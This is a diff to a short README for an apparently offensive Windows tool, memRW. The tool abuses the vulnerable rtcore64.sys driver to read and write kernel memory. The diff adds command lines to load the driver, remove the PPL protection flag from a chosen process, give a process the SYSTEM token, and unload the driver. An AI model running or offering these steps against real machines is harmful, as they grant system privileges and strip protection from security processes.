@@ -3,8 +3,13 @@ Playing with unsecured driver(s) allowing read/write to kernel memory.</br></br>
 For now, playing with EPROCESS :</br>
 -removing PPL flag</br>
 -stealing system token</br>
-
 </br>
+
+memRW.exe load %cd%\rtcore64.sys
+memRW.exe list
+memRW.exe removeppl PID
+memRW.exe makesystem PID
+memRW.exe unload %cd%\rtcore64.sys
 
 Greatly inspired by https://github.com/RedCursorSecurityConsulting/PPLKiller </br>
 
